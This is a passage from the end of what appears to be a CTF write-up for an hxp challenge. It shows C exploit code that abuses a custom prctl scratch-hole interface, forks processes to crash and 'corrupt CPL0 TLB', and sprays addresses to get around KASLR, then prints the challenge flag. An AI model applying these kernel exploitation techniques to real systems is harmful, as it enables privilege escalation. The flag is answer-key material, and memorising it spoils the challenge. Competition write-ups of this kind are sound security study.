  SYSCHK(prctl(PR_SET_SCRATCH_HOLE, trampolin));
  for (size_t i = 0; i < sizeof(package) / 0x400; i++) {
    load_scratch(i, 0, &package[i * slice_size_value], slice_size_value);
  }

  pid_t pid = fork();
  if (pid == 0) {
    linfo("crash and corrupt CPL0 TLB: %p", payload);
    load_scratch(-1, 0, "X", 1);
  }
  wait(NULL);
  linfo("spray kaslr");

  for (trampolin = (size_t*) (START_SEARCH); 
      trampolin < END_SEARCH; trampolin += 0x100000 / sizeof(size_t)) {
    // linfo("spray aslr: %p", trampolin);
    SYSCHK(prctl(PR_SET_SCRATCH_HOLE, trampolin));
    if (((size_t) trampolin & 0xfffffff) == 0)
      linfo("spray aslr: %p", trampolin);
    // flush TLB
    pid_t pid = fork();
    if (pid == 0) 
      load_scratch(-1, 0, "X", 1);
    wait(NULL);
  }
  putchar('\n');

  lstage("END");

  return 0;

} 
```


</details>

FLAG: `hxp{tH1s_1s_th3_AI_$$$s3Ri3$$$_n0t_tH3_s3CuR3_s3R1eS}`
